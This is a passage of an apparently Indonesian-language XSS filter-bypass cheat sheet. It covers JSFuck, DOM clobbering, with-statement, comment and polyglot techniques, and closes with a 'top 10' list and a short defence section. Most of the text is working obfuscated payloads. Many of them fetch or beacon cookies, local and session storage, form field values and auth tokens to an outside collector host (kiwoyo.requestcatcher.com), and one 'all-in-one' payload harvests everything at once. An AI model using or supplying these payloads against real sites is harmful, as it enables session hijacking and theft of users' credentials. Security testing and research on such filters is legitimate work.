" autofocus onfocus="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]" x="
" onclick="[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]][0]('alert(1)')()" x="
' onmouseover='(![]+[])[!+[]+!+[]+!+[]]' x='
" onload="([![]]+[][[]])[+!+[]+[+[]]]" x="
' accesskey='x' onclick='(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]' x='
```


#### Advanced: Data Exfiltration
```javascript
// Konsep JSFuck untuk fetch (sangat panjang, simplified)
// alert
(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]

// Untuk exfiltration lengkap, payload JSFuck bisa >10000 karakter
// Lebih praktis gunakan teknik lain untuk exfiltration

// Contoh hybrid: JSFuck + normal untuk exfiltration
<img src=x onerror="
    a=(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]; // 'al'
    []['filter']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')();
">
```

---

## 17. DOM Clobbering + Constructor

### Teknik: Manipulasi DOM untuk bypass

#### Basic Usage
```html
<form id="constructor"><input name="constructor"></form>
<script>
// Sekarang window.constructor bisa ter-clobber
// Tapi [].filter.constructor masih bisa diakses
[]['filter'][[]['filter']['constructor']['name']]('alert(1)')()
</script>
```

#### HTML Context Examples
```html
<!-- DOM Clobbering with form -->
<form id="alert"><input name="alert"></form>
<img src=x onerror="[]['filter']['constructor']('alert(1)')()">

<!-- Clobbering with anchor -->
<a id="fetch" href="//kiwoyo.requestcatcher.com"></a>
<img src=x onerror="[]['map']['constructor']('alert(1)')()">

<!-- Clobbering multiple names -->
<form id="constructor"><input name="constructor" value="clobbered"></form>
<form id="Function"><input name="Function" value="blocked"></form>
<script>[]['filter']['constructor']('alert(1)')()</script>

<!-- Image with clobbering -->
<img name="alert" id="alert">
<img src=x onerror="window[[]['\x66\x69\x6c\x74\x65\x72']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\x72\x65\x74\x75\x72\x6e\x20\x61\x6c\x65\x72\x74')()('XSS')]">

<!-- Bypass clobbering with array method -->
<form id="eval"><input name="eval"></form>
<svg onload="[]['find']['constructor']('alert(1)')()">

<!-- Multiple clobbering layers -->
<a id="document" href="#">
<form id="cookie"><input name="cookie"></form>
<img src=x onerror="[]['reduce']['constructor']('alert(1)')()">
```

#### URL Context Examples
```html
javascript:[]['filter'][Object.keys([]['filter'])[1]]('alert(1)')()
javascript:[]['map'][[]['map']['constructor']['name']]('alert(1)')()
javascript://example.com/%0A[]['find'][Object.keys([]['find'])[1]]('alert(1)')()//
javascript:void([]['reduce'][Object.getOwnPropertyNames([]['reduce'])[1]]('alert(1)')())
javascript:%0d[]['forEach'][[]['forEach']['constructor']['name']]('alert(1)')()
javascript:/**/.['filter'][Object.keys([]['filter'])[1]]('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="[]['filter'][Object.keys([]['filter'])[1]]('alert(1)')()" x="
" onclick="[]['map'][[]['map']['constructor']['name']]('alert(1)')()" x="
' onmouseover='[]["find"][Object.keys([]["find"])[1]]("alert(1)")()' x='
" onload="[]['reduce'][Object.getOwnPropertyNames([]['reduce'])[1]]('alert(1)')()" x="
' accesskey='x' onclick='[]["forEach"][[]["forEach"]["constructor"]["name"]]("alert(1)")()' x='
" onfocus="[]['map'][Object.keys([]['map'])[1]]('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" autofocus x="
```

#### Advanced: Data Exfiltration
```javascript
// DOM Clobbering tidak menghalangi array constructor
<form id="fetch"><input name="fetch" value="clobbered"></form>
<script>
// window.fetch ter-clobber, gunakan array constructor
[]['map']['constructor'](`
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '//kiwoyo.requestcatcher.com/?c='+document.cookie);
    xhr.send();
`)()
</script>

// Bypass dengan constructor chain
<a id="alert" href="#">Alert clobbered</a>
<script>
[]['filter']['constructor'](`
    var img = document.createElement('img');
    img.src = '//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify({
        cookie: document.cookie,
        domain: document.domain
    }));
`)()
</script>

// Multiple clobbering with exfiltration
<form id="XMLHttpRequest"><input name="XMLHttpRequest"></form>
<form id="fetch"><input name="fetch"></form>
<script>
// Gunakan navigator.sendBeacon atau Image
[]['find']['constructor'](`
    navigator.sendBeacon('//kiwoyo.requestcatcher.com/beacon', JSON.stringify({
        cookie: document.cookie,
        storage: JSON.stringify(localStorage)
    }));
`)()
</script>

// Clobbering bypass dengan Image object
<img id="Image" name="Image">
<script>
[]['reduce']['constructor'](`
    var i = document.createElement('img');
    i.src = '//kiwoyo.requestcatcher.com/?data='+encodeURIComponent(document.cookie);
    document.body.appendChild(i);
`)()
</script>

// Complete bypass semua clobbering
<form id="fetch"><input name="fetch"></form>
<form id="XMLHttpRequest"><input name="XMLHttpRequest"></form>
<a id="alert" href="#">
<script>
// Gunakan constructor untuk buat fungsi baru
[]['forEach']['constructor'](`
    var exfil = function(data) {
        var img = document.createElement('img');
        img.src = '//kiwoyo.requestcatcher.com/?d='+btoa(data);
        document.body.appendChild(img);
    };
    exfil(JSON.stringify({
        cookie: document.cookie,
        forms: Array.from(document.forms).map(f => ({
            id: f.id,
            action: f.action
        }))
    }));
`)()
</script>
```

---

## 18. With Statement Tricks

### Teknik: Mengubah scope resolution

#### Basic Usage
```javascript
with(document){
    with(body){
        []['filter']['constructor']('alert(1)')()
    }
}

// Atau lebih subtle
with([]){filter.constructor('alert(document.domain)')()}
```

#### HTML Context Examples
```html
<!-- Image -->
<img src=x onerror="with([]){filter.constructor('alert(1)')()}">

<!-- SVG -->
<svg onload="with(document){with(body){[]['map']['constructor']('alert(1)')()}}">

<!-- Input -->
<input autofocus onfocus="with([]){find.constructor('alert(document.domain)')()}">

<!-- Button -->
<button onclick="with(window){[]['reduce']['constructor']('alert(origin)')()}">Click</button>

<!-- Body -->
<body onload="with([]){forEach.constructor('alert(document.cookie)')()}">

<!-- Anchor -->
<a href="javascript:with([]){map.constructor('alert(1)')()}">Link</a>

<!-- Div -->
<div onmouseover="with(document){[]['filter']['constructor']('alert(1)')()}">Hover</div>

<!-- Form -->
<form onsubmit="with([]){filter.constructor('alert(1)')()};return false">

<!-- Video -->
<video onloadstart="with(window){[]['map']['constructor']('alert(1)')()}">

<!-- Details -->
<details ontoggle="with([]){reduce.constructor('alert(document.domain)')()}">
```


#### Advanced: Data Exfiltration
```javascript
// With statement exfiltration
with([]){
    filter.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
}

// Nested with for exfiltration
with(document){
    with([]){
        map.constructor(`
            fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify({
                cookie: document.cookie,
                domain: document.domain,
                url: location.href
            })))
        `)()
    }
}

// With window scope
with(window){
    with([]){
        find.constructor(`
            var payload = {
                cookie: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            };
            fetch('//kiwoyo.requestcatcher.com/?data='+encodeURIComponent(JSON.stringify(payload)));
        `)()
    }
}

// Multiple with statements
with([]){
    with(document){
        with(location){
            []['reduce']['constructor'](`
                fetch('//kiwoyo.requestcatcher.com/exfil?'+
                    'cookie='+encodeURIComponent(document.cookie)+
                    '&url='+encodeURIComponent(href)+
                    '&domain='+domain
                )
            `)()
        }
    }
}

// With statement POST exfiltration
with([]){
    forEach.constructor(`
        fetch('//kiwoyo.requestcatcher.com/steal', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                cookie: document.cookie,
                forms: Array.from(document.forms).map(f => ({
                    action: f.action,
                    elements: Array.from(f.elements).map(e => ({
                        name: e.name,
                        value: e.value,
                        type: e.type
                    }))
                }))
            })
        })
    `)()
}

// With reversal combo
with([]){
    filter.constructor(`
        x='hctef'.split('').reverse().join('');
        self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie);
    `)()
}
```

---

## 19. Comments & Whitespace Manipulation

### Teknik: Menyembunyikan di whitespace

#### Basic Usage
```javascript
[]/*comment*/['filter']/**/['constructor']/**/('alert(1)')()

// Tab, newline, etc
[][
'filter'
][
'constructor'
](
'alert(1)'
)(
)

// HTML comment style (dalam HTML)
<!--
[]['filter']['constructor']('alert(1)')()
//-->
```

#### HTML Context Examples
```html
<!-- Image with comments -->
<img src=x onerror="[]/*bypass*/['map']/*filter*/['constructor']('alert(1)')()">

<!-- SVG with whitespace -->
<svg onload="[][
'filter'
][
'constructor'
]('alert(1)')()">

<!-- Input with HTML comments -->
<input autofocus onfocus="<!--
[]['find']['constructor']('alert(1)')()
//-->">

<!-- Button with mixed -->
<button onclick="[]/*x*/['reduce']/*y*/['constructor']/*z*/('alert(1)')()">Click</button>

<!-- Body multi-line -->
<body onload="
[][
    'forEach'
][
    'constructor'
](
    'alert(1)'
)()
">

<!-- Anchor with comments -->
<a href="javascript:[]/*comment*/['map']['constructor']('alert(1)')()">Link</a>

<!-- Div with tabs -->
<div onmouseover="[]	['filter']	['constructor']	('alert(1)')()">Hover</div>

<!-- Form with newlines -->
<form onsubmit="[]
['find']
['constructor']
('alert(1)')();return false">
```

#### URL Context Examples
```html
javascript:[]/*bypass*/['map']/*filter*/['constructor']('alert(1)')()
javascript:[][/*a*/'filter'/*b*/][/*c*/'constructor'/*d*/]('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript://example.com/%0A[]/*x*/['find']/*y*/['constructor']('alert(1)')()//
javascript:void([]/**/['reduce']/**/['constructor']('alert(document.domain)')())
javascript:%0d[]/*1*/['forEach']/*2*/['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
javascript:/**/./**/['map']/**/['constructor']('alert(1)')()
```

#### Attribute Context Examples
```html
" autofocus onfocus="[]/*bypass*/['map']/*waf*/['constructor']('alert(1)')()" x="
" onclick="[][/*a*/'filter'/*b*/][/*c*/'constructor'/*d*/]('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='[]/*x*/["find"]/*y*/["constructor"]("alert(1)")()' x='
" onload="[]/**/['reduce']/**/['constructor']('alert(document.domain)')()" x="
' accesskey='x' onclick='[]/*1*/["forEach"]/*2*/["constructor"]("alert(1)")()' x='
" onfocus="[][/*a*/'map'/*b*/][/*c*/'constructor'/*d*/]('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Comments in exfiltration
[]/*bypass*/['map']/*waf*/['constructor'](/*start*/'fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)'/*end*/)()

// Whitespace manipulation
[][
    'filter'
][
    'constructor'
](
    `
        fetch(
            '//kiwoyo.requestcatcher.com/?leak='+
            btoa(
                JSON.stringify({
                    cookie: document.cookie,
                    domain: document.domain
                })
            )
        )
    `
)()

// HTML comment style exfiltration
<!--
[]['find']['constructor'](`
    var payload = {
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        url: location.href
    };
    fetch('//kiwoyo.requestcatcher.com/?data='+encodeURIComponent(JSON.stringify(payload)));
`)()
//-->

// Mixed comments and whitespace
[]/*step1*/[
    'reduce'
]/*step2*/[
    'constructor'
]/*step3*/(/*step4*/
    'fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)'
/*step5*/)/*step6*/(/*step7*/)/*end*/

// Multi-line with comments
[][
    /*array*/'forEach'
][
    /*function*/'constructor'
](
    /*payload*/`
        // Exfiltration code
        var data = {
            cookie: document.cookie,
            domain: document.domain
        };
        /* Send data */
        fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify(data)));
    `/*end payload*/
)(/*execute*/)

// Complete obfuscation with comments
[]/*a*/[/*b*/'map'/*c*/]/*d*/[/*e*/'constructor'/*f*/]/*g*/(/*h*/
    `
        /*exfil start*/
        fetch(
            '//kiwoyo.requestcatcher.com/steal',
            {
                method: 'POST',
                body: JSON.stringify({
                    cookie: document.cookie,
                    forms: Array.from(document.forms).map(f => ({
                        action: f.action
                    }))
                })
            }
        )
        /*exfil end*/
    `
/*i*/)/*j*/(/*k*/)/*complete*/
```

---

## 20. Polyglot Approaches

### Teknik: Valid di multiple contexts

#### Basic Usage
```javascript
/*--></title></style></script><script>[]['filter']['constructor']('alert(1)')()</script>

javascript:/*--></title></style></textarea></script>--><script>[]['map']['constructor']('alert(origin)')()</script>

/*"></script><svg onload='[]["filter"]["constructor"]("alert(1)")()'></svg>*/
```

#### HTML Context Examples
```html
<!-- Multi-context polyglot -->
/*--></title></style></script>
<script>[]['filter']['constructor']('alert(1)')()</script><!--*/

<!-- URL + HTML polyglot -->
javascript:/*"></script><img src=x onerror="[]['map']['constructor']('alert(1)')()">*/

<!-- Comment + Script polyglot -->
/*<script>*/[]['find']['constructor']('alert(1)')()/*</script>*/

<!-- Style + Script polyglot -->
</style><script>[]['reduce']['constructor']('alert(1)')()</script><style>

<!-- Textarea escape polyglot -->
</textarea><script>[]['forEach']['constructor']('alert(1)')()</script><textarea>

<!-- Title escape polyglot -->
</title><script>[]['map']['constructor']('alert(1)')()</script><title>

<!-- Multiple tag close polyglot -->
--></script></title></style><script>[]['filter']['constructor']('alert(1)')()</script><!--

<!-- SVG + Script polyglot -->
</script><svg onload="[]['find']['constructor']('alert(1)')()"></svg><script>

<!-- Attribute + Script polyglot -->
" onclick="[]['reduce']['constructor']('alert(1)')()"><script>alert(1)</script><div x="

<!-- Form + Script polyglot -->
</form><script>[]['map']['constructor']('alert(1)')()</script><form>
```

#### URL Context Examples
```html
javascript:/*--></title></style></script><script>[]['filter']['constructor']('alert(1)')()</script>
javascript:/*"></script><img src=x onerror="[]['map']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()">*/
javascript://example.com/%0A/*</script><svg onload='[]["find"]["constructor"]("alert(1)")()'></svg>*///
javascript:void(/*--></script><script>[]['reduce']['constructor']('alert(document.domain)')()</script>*/)
javascript:%0d/*"></textarea><script>[]['forEach']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()</script>*/
javascript:/**//*</style><script>[]['filter']['constructor']('alert(1)')()</script>*/
```

#### Attribute Context Examples
```html
" autofocus onfocus="/*--></script><script>[]['filter']['constructor']('alert(1)')()</script>*/" x="
" onclick="/*"></script><img src=x onerror=alert(1)>*/[]['map']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
' onmouseover='/*</script><svg onload=alert(1)>*/[]["find"]["constructor"]("alert(1)")()' x='
" onload="/*--></title></script><script>[]['reduce']['constructor']('alert(document.domain)')()</script>*/" x="
' accesskey='x' onclick='/*</textarea><script>*/[]["forEach"]["constructor"]("alert(1)")()' x='
" onfocus="/*"></script><script>[]['map']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() </script>*/" autofocus x="
```


#### Advanced: Data Exfiltration
```javascript
// Polyglot exfiltration basic
/*--></title></style></script>
<script>
[]['filter']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
</script><!--*/

// Multi-context exfiltration
javascript:/*"></textarea></script>
<script>
[]['map']['constructor'](`
    fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(JSON.stringify({
        cookie: document.cookie,
        domain: document.domain,
        url: location.href
    })))
`)()
</script>
*/

// SVG polyglot exfiltration
/*"></script><svg onload="
    x='hctef'.split('').reverse().join('');
    self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie);
"></svg>*/

// Complete polyglot with POST
/*--></title></style></textarea></script>
<script>
[]['find']['constructor'](`
    fetch('//kiwoyo.requestcatcher.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookie: document.cookie,
            localStorage: JSON.stringify(localStorage),
            forms: Array.from(document.forms).map(f => ({
                action: f.action,
                inputs: Array.from(f.elements).map(e => ({
                    name: e.name,
                    value: e.value,
                    type: e.type
                }))
            }))
        })
    })
`)()
</script><!--*/

// Attribute escape polyglot
" onclick="x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)">
<script>
[]['reduce']['constructor']('fetch("//kiwoyo.requestcatcher.com/?backup="+document.cookie)')()
</script><div x="

// Multi-layer polyglot exfiltration
/*--></script></title></style></textarea></select></form>
<script>
// Layer 1: Direct fetch
fetch('//kiwoyo.requestcatcher.com/layer1?c='+document.cookie);

// Layer 2: Constructor chain
[]['map']['constructor'](`
    var data = {
        cookie: document.cookie,
        domain: document.domain,
        storage: JSON.stringify(localStorage)
    };
    fetch('//kiwoyo.requestcatcher.com/layer2?d='+btoa(JSON.stringify(data)));
`)()

// Layer 3: Reversal technique
x='hctef'.split('').reverse().join('');
self[x]('//kiwoyo.requestcatcher.com/layer3?c='+document.cookie);
</script><!--*/
```

---

## 🎯 Quick Reference Cheat Sheet

### Top 10 Most Effective Payloads for Labs:

```javascript
// 1. String Reversal (Bypass keyword filters)
x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)

// 2. Array Constructor (Bypass Function/eval blacklist)
[]['map']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// 3. String Constructor (Alternative constructor access)
''['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// 4. Unicode Encoding (Bypass string filters)
[]['filter']['constructor']('\u0066\u0065\u0074\u0063\u0068("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// 5. Template Literal (Modern syntax bypass)
[]['map']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)()

// 6. RegExp Constructor (Alternative path)
/./['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// 7. Error Constructor (Unusual but effective)
Error.constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// 8. Async Function (Modern approach)
(async function(){}).constructor('await fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// 9. Reflect API (Advanced bypass)
Reflect.get([],'map').constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()

// 10. Mixed Encoding (Ultimate obfuscation)
[]['\146\x69\u006c\x74\145\162']['\x63\u006f\156\x73\164\x72\165\143\164\x6f\162']('\x66\u0065\164\x63\150("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
```

### Complete Data Exfiltration Payload (All-in-One):

```javascript
[]['map']['constructor'](`
    // Collect all data
    var payload = {
        // Basic info
        cookie: document.cookie,
        domain: document.domain,
        url: location.href,
        referrer: document.referrer,
        
        // Storage
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        
        // Forms data
        forms: Array.from(document.forms).map(f => ({
            id: f.id,
            name: f.name,
            action: f.action,
            method: f.method,
            inputs: Array.from(f.elements).map(e => ({
                name: e.name,
                type: e.type,
                value: e.value
            }))
        })),
        
        // Tokens
        tokens: Object.keys(localStorage).reduce((acc, key) => {
            if(key.match(/token|jwt|auth|session|key/i)) {
                acc[key] = localStorage.getItem(key);
            }
            return acc;
        }, {}),
        
        // Meta
        userAgent: navigator.userAgent,
        timestamp: Date.now()
    };
    
    // Send via fetch
    fetch('//kiwoyo.requestcatcher.com/complete?data='+encodeURIComponent(btoa(JSON.stringify(payload))));
`)()
```

---

## 🛡️ Defense Recommendations

### For Developers:

1. **Content Security Policy (CSP)**
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-random123'">
   ```

2. **Input Sanitization**
   - Use DOMPurify for HTML
   - Escape special characters: `< > " ' & / \`
   - Validate input types and lengths

3. **Output Encoding**
   - HTML entity encoding: `&lt; &gt; &quot; &#x27; &amp;`
   - JavaScript encoding: `\x3c \x3e \x22 \x27`
   - URL encoding: `%3C %3E %22 %27`

4. **Framework Protection**
   - React: Use JSX (auto-escapes)
   - Angular: Built-in sanitization
   - Vue: Avoid v-html when possible

5. **HTTP Headers**
   ```
   X-Content-Type-Options: nosniff
   X-Frame-Options: DENY
   X-XSS-Protection: 1; mode=block
   ```

6. **Server-Side Detection**
   ```javascript
   // Detect common bypass patterns
   const suspiciousPatterns = [
       /constructor/i,
       /\[['"]constructor['"]\]/i,
       /\.constructor/i,
       /split.*reverse.*join/i,
       /\\x[0-9a-f]{2}/i,
       /\\u[0-9a-f]{4}/i,
       /\\[0-7]{3}/i
   ];
   ```


## 🔥 Advanced Combination Example

```javascript
// Ultimate bypass: Reversal + Constructor + Encoding + Template
x='\150\x63\u0074\x65\146'.split('').reverse().join(''); // 'fetch' reversed & encoded
y='\141\x6f\u0074\142'.split('').reverse().join(''); // 'btoa' reversed & encoded

[]['map']['constructor'](`
    var data = {
        cookie: document.cookie,
        domain: document.domain,
        storage: JSON.stringify(localStorage),
        forms: Array.from(document.forms).map(f => ({
            action: f.action,
            inputs: Array.from(f.elements).map(e => ({
                name: e.name,
                value: e.value
            }))
        }))
    };
    
    self[x](\`//kiwoyo.requestcatcher.com/?leak=\${window[y](JSON.stringify(data))}\`);
`)()
```

---
